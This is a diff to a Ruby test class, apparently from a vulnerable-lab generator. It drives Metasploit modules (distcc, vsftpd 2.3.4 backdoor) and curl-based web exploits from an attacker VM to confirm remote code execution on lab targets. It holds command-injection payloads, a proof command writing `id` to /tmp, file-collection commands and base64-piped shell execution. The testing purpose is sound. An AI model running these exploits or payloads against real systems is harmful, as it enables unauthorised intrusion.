@@ -363,63 +363,114 @@ class PostProvisionTest
                      &.dig('name')
   end
 
-  # --- Metasploit exploit helper (tier 3) ---------------------------------
-  # Drive a Metasploit exploit module from the attacker VM against this system
-  # (the target under test) and record a tier-3 PASS/FAIL/SKIP.
-  #
-  # The default payload is the no-session cmd/unix/generic: the exploit runs a
-  # command *on the target*, so there is no reverse/bind shell to race. Proof of
-  # RCE is a sentinel file the command leaves on the target, which we read back
-  # over the target's own guest agent and check for `uid=`. `collect:` appends
-  # extra shell (e.g. 'cat /home/distccd/*') whose output is captured into the
-  # sentinel as evidence. `options:` adds/overrides msf datastore settings
-  # (RHOSTS/RPORT/PAYLOAD/CMD are set for you; pass LHOST etc. here if needed).
-  #
-  #   test_msf_exploit('exploit/unix/misc/distcc_exec',
-  #                    rport: 3632, collect: 'cat /home/distccd/*')
-  def test_msf_exploit(msf_module, rhost: nil, rport: self.port, attacker: nil,
-                       payload: 'cmd/unix/generic', collect: nil,
-                       options: {}, tier: 3, label: nil)
-    name = label || "msf exploit (#{msf_module})"
-
-    unless proxmox?
-      skip_check(name, 'msf exploit tests run only on the Proxmox pipeline', tier: tier)
-      return
-    end
-    attacker ||= attack_system
-    unless attacker && system_present?(attacker)
-      skip_check(name, "No attacker (base type='attack') system in this project; exploit skipped", tier: tier)
-      return
-    end
-    rhost ||= system_ip                 # may SKIP if the target IP can't be resolved
-    attacker_ip = other_system_ip(attacker)
-    if rhost.nil? || attacker_ip.nil?
-      skip_check(name, "Could not resolve target (#{rhost.inspect}) or attacker (#{attacker_ip.inspect}) IP", tier: tier)
-      return
-    end
-
+  # --- Proof-of-RCE sentinel (shared by the exploit helpers) --------------
+  # A sentinel is a world-readable file the exploit leaves *on the target*; a
+  # command that ran as some user writes `id` (and the hostname, plus any
+  # `collect:` output) into it, and we read it back over the target's own guest
+  # agent. A fresh nonce per call means an old file can't produce a false pass.
+  # Returns [sentinel_path, command_string].
+  def build_sentinel(collect = nil)
     nonce = "#{Time.now.to_i}_#{rand(100000)}"
     sentinel = "/tmp/secgen_pwned_#{nonce}"
     cmd = "id > #{sentinel}; uname -n >> #{sentinel}; "
     cmd += "#{collect} >> #{sentinel} 2>/dev/null; " if collect
     cmd += "chmod 644 #{sentinel}"
+    [sentinel, cmd]
+  end
 
-    settings = { 'RHOSTS' => rhost, 'RPORT' => rport, 'PAYLOAD' => payload, 'CMD' => cmd }
+  # Read a sentinel back over the target's own guest agent. Returns its body
+  # (empty string if absent), and files it as evidence when present.
+  def read_sentinel(sentinel)
+    body = run_vagrant_ssh("cat #{sentinel} 2>/dev/null", timeout: 30)[:stdout].to_s
+    add_evidence('sentinel_on_target', "echo #{Shellwords.escape(body)}") unless body.empty?
+    body
+  end
+
+  # True when a sentinel body proves a command ran on the target.
+  def sentinel_pwned?(body)
+    body =~ /uid=\d+/ ? true : false
+  end
+
+  # Resolve [attacker_name, attacker_ip, rhost] for an attacker-VM exploit, or
+  # record a tier-`tier` SKIP under `name` and return nil (so the caller can
+  # `return` cleanly). Proxmox-only; needs a sibling base type='attack'.
+  def resolve_attacker(name, attacker, rhost, tier)
+    unless proxmox?
+      skip_check(name, 'attacker-VM exploit tests run only on the Proxmox pipeline', tier: tier)
+      return nil
+    end
+    attacker ||= attack_system
+    unless attacker && system_present?(attacker)
+      skip_check(name, "No attacker (base type='attack') system in this project; exploit skipped", tier: tier)
+      return nil
+    end
+    rhost ||= system_ip                 # may SKIP if the target IP can't be resolved
+    attacker_ip = other_system_ip(attacker)
+    if rhost.nil? || attacker_ip.nil?
+      skip_check(name, "Could not resolve target (#{rhost.inspect}) or attacker (#{attacker_ip.inspect}) IP", tier: tier)
+      return nil
+    end
+    [attacker, attacker_ip, rhost]
+  end
+
+  # --- Metasploit exploit helper (tier 3) ---------------------------------
+  # Drive a Metasploit exploit module from the attacker VM against this system
+  # (the target under test) and record a tier-3 PASS/FAIL/SKIP.
+  #
+  # Two exploit shapes, selected by `session:`:
+  #   * session: false (default) — a no-session payload (cmd/unix/generic): the
+  #     exploit runs our sentinel command *on the target* via its CMD datastore,
+  #     so there is no reverse/bind shell to race.
+  #   * session: true — a shell-session payload (default cmd/unix/interact, e.g.
+  #     the vsftpd 2.3.4 backdoor): the exploit opens a session, then we run the
+  #     sentinel command in it with `sessions -c` (base64-wrapped so no ';' leaks
+  #     into msfconsole's -x command list) and kill the session.
+  # Either way, proof of RCE is the sentinel the target's own guest agent reads
+  # back (checked for `uid=`). `collect:` appends extra shell (e.g.
+  # 'cat /home/distccd/*') whose output is captured into the sentinel as
+  # evidence. `options:` adds/overrides msf datastore settings (RHOSTS/RPORT/
+  # PAYLOAD, and CMD in no-session mode, are set for you; pass LHOST etc. here).
+  #
+  #   test_msf_exploit('exploit/unix/misc/distcc_exec',
+  #                    rport: 3632, collect: 'cat /home/distccd/*')
+  #   test_msf_exploit('exploit/unix/ftp/vsftpd_234_backdoor',
+  #                    rport: 21, session: true)
+  def test_msf_exploit(msf_module, rhost: nil, rport: self.port, attacker: nil,
+                       payload: nil, session: false, collect: nil,
+                       options: {}, tier: 3, label: nil)
+    name = label || "msf exploit (#{msf_module})"
+    resolved = resolve_attacker(name, attacker, rhost, tier)
+    return unless resolved
+    attacker, attacker_ip, rhost = resolved
+
+    payload ||= session ? 'cmd/unix/interact' : 'cmd/unix/generic'
+    sentinel, cmd = build_sentinel(collect)
+
+    settings = { 'RHOSTS' => rhost, 'RPORT' => rport, 'PAYLOAD' => payload }
+    settings['CMD'] = cmd unless session   # a session payload takes no CMD
     settings.merge!(options.map { |k, v| [k.to_s, v] }.to_h)
     set_lines = settings.map { |k, v| "set #{k} #{msf_set_value(v)};" }.join(' ')
+
+    if session
+      # Run the sentinel command inside the opened shell session. base64-wrap it
+      # so the ';'s don't split msfconsole's -x command list, then tear the
+      # session down.
+      b64 = Base64.strict_encode64(cmd)
+      run_cmds = "run -z; sleep 6; sessions -c echo #{b64}|base64 -d|sh; sleep 4; sessions -K;"
+    else
+      run_cmds = "run; sleep 8;"
+    end
 
     # HOME must be exported: the guest agent runs commands with no HOME, and
     # msfconsole's rb-readline aborts on startup without it.
     msf = "export HOME=/root TERM=dumb; msfconsole -q -x \"use #{msf_module}; " \
-          "#{set_lines} run; sleep 8; exit -y\""
+          "#{set_lines} #{run_cmds} exit -y\""
     result = run_on_system(attacker, msf, timeout: (ENV['SECGEN_MSF_TIMEOUT'] || 600).to_i)
     msf_out = "#{result[:stdout]}\n#{result[:stderr]}"
     add_evidence('msf_output', "echo #{Shellwords.escape(msf_out[-4000..-1] || msf_out)}")
 
-    body = run_vagrant_ssh("cat #{sentinel} 2>/dev/null", timeout: 30)[:stdout].to_s
-    add_evidence('sentinel_on_target', "echo #{Shellwords.escape(body)}") unless body.empty?
-
-    if body =~ /uid=\d+/
+    body = read_sentinel(sentinel)
+    if sentinel_pwned?(body)
       pass_check(name,
                  "RCE confirmed: #{msf_module} from #{attacker} (#{attacker_ip}) ran a command on the target (#{rhost}); sentinel #{sentinel} contains #{body[/uid=\S+/]}.",
                  tier: tier)
@@ -435,6 +486,111 @@ class PostProvisionTest
   def msf_set_value(value)
     s = value.to_s
     s =~ /[\s;'"|&<>$`]/ ? "'#{s.gsub("'", %q('\\''))}'" : s
+  end
+
+  # --- HTTP exploit helpers (tier 3, non-Metasploit) ----------------------
+  # For web vulns with no Metasploit module: craft the attack as raw HTTP
+  # request(s) run with curl *on the attacker VM* (run_on_system), so the
+  # traffic crosses the scenario network exactly as a remote attacker's would —
+  # the same attacker-VM / guest-agent shape as test_msf_exploit.
+
+  # Run one HTTP request with curl on the attacker against the target. Returns
+  # {status:, body:, error:, curl:} (status 0 means the request didn't complete).
+  def http_from_attacker(path, attacker:, rhost:, method: 'GET', data: nil,
+                         headers: {}, include_headers: false, rport: self.port,
+                         scheme: 'http', timeout: 60)
+    path = "/#{path}" unless path.to_s.start_with?('/')
+    url = "#{scheme}://#{rhost}:#{rport.to_i}#{path}"
+    marker = HTTP_STATUS_MARKER
+    argv = ['curl', '-sk', '--max-time', timeout.to_s, '-X', method.to_s.upcase]
+    argv << '-D' << '-' if include_headers   # dump response headers into :body
+    headers.each { |k, v| argv += ['-H', "#{k}: #{v}"] }
+    argv += ['--data-binary', data.to_s] unless data.nil?
+    argv += ['-o', '-', '-w', "\\n#{marker}%{http_code}", url]
+    curl = argv.map { |a| Shellwords.escape(a) }.join(' ')
+
+    result = run_on_system(attacker, curl, timeout: timeout + 30)
+    out = result[:stdout].to_s
+    idx = out.rindex(marker)
+    if idx.nil?
+      return { status: 0, body: out, curl: curl,
+               error: "no HTTP response from attacker curl (#{result[:stderr].to_s.strip[0, 200]})" }
+    end
+    status = out[(idx + marker.size)..-1].to_i
+    body = out[0...idx].sub(/\n\z/, '')
+    { status: status, body: body, curl: curl,
+      error: status.zero? ? "curl could not reach #{rhost}:#{rport}" : nil }
+  end
+
+  # Tier-3 web exploit driven from the attacker VM, recorded as PASS/FAIL/SKIP.
+  # Proof comes in either (or both) of the two shapes real web exploits take:
+  #   * expect:  a String (substring) or Regexp the *response body* must contain
+  #              / match — data exfiltration, auth bypass, path traversal, where
+  #              the proof is what the server sends back. expect_status: also
+  #              asserts the HTTP status code.
+  #   * sentinel: true — the request runs a command *on the target* (command
+  #              injection); proof is a sentinel the target's own guest agent
+  #              reads back (checked for `uid=`), exactly as test_msf_exploit
+  #              does. Put the placeholder {{CMD}} in path/data/a header value
+  #              where the injected shell belongs; it is replaced with the
+  #              sentinel-writing command. collect: appends extra shell whose
+  #              output is captured into the sentinel as evidence.
+  # The check PASSes only if every requested assertion holds.
+  #
+  # include_headers: true prepends the response headers to what `expect` matches
+  # against, so assertions can target a header (e.g. a 302 Location, a Set-Cookie
+  # or a Server banner) rather than the body.
+  #
+  #   test_http_exploit('/login.php', method: 'POST',
+  #                     data: "username=#{inj}&password=x",
+  #                     expect: 'Login successful')
+  #   test_http_exploit('/vuln?host=127.0.0.1;{{CMD}};', sentinel: true)
+  def test_http_exploit(path, method: 'GET', data: nil, headers: {},
+                        expect: nil, expect_status: nil, sentinel: false,
+                        collect: nil, include_headers: false, attacker: nil,
+                        rhost: nil, rport: self.port, scheme: 'http', tier: 3,
+                        label: nil, timeout: 120)
+    name = label || "http exploit (#{method.to_s.upcase} #{path})"
+    resolved = resolve_attacker(name, attacker, rhost, tier)
+    return unless resolved
+    attacker, attacker_ip, rhost = resolved
+
+    sentinel_path = nil
+    if sentinel
+      sentinel_path, scmd = build_sentinel(collect)
+      sub = ->(s) { s.nil? ? nil : s.to_s.gsub('{{CMD}}', scmd) }
+      path = sub.call(path)
+      data = sub.call(data)
+      headers = headers.map { |k, v| [k, sub.call(v)] }.to_h
+    end
+
+    resp = http_from_attacker(path, method: method, data: data, headers: headers,
+                              include_headers: include_headers, attacker: attacker,
+                              rhost: rhost, rport: rport, scheme: scheme, timeout: timeout)
+    add_evidence('http_request', "echo #{Shellwords.escape(resp[:curl])}")
+    add_evidence('http_response',
+                 "echo #{Shellwords.escape("HTTP #{resp[:status]}\n#{resp[:body].to_s[0, 4000]}")}")
+
+    checks = []
+    unless expect.nil?
+      body = resp[:body].to_s
+      ok = expect.is_a?(Regexp) ? !(body =~ expect).nil? : body.include?(expect.to_s)
+      checks << ["response body matches #{expect.inspect}", ok]
+    end
+    checks << ["HTTP status == #{expect_status}", resp[:status].to_i == expect_status.to_i] unless expect_status.nil?
+    if sentinel
+      checks << ['target sentinel proves command execution (uid=)', sentinel_pwned?(read_sentinel(sentinel_path))]
+    end
+    checks << ['attacker got an HTTP response', resp[:error].nil?] if checks.empty?
+
+    detail = checks.map { |lbl, ok| "#{ok ? 'ok' : 'FAILED'}: #{lbl}" }.join('; ')
+    origin = "from #{attacker} (#{attacker_ip}) against #{rhost}:#{rport}"
+    http = "HTTP #{resp[:status]}#{resp[:error] ? " (#{resp[:error]})" : ''}"
+    if checks.all? { |_, ok| ok }
+      pass_check(name, "Web exploit confirmed #{origin} — #{detail}. #{http}.", tier: tier)
+    else
+      fail_check(name, "Web exploit not confirmed #{origin} — #{detail}. #{http}. See http_request/http_response evidence.", tier: tier)
+    end
   end
 
   # Run a shell command as the given account (login shell, that user's
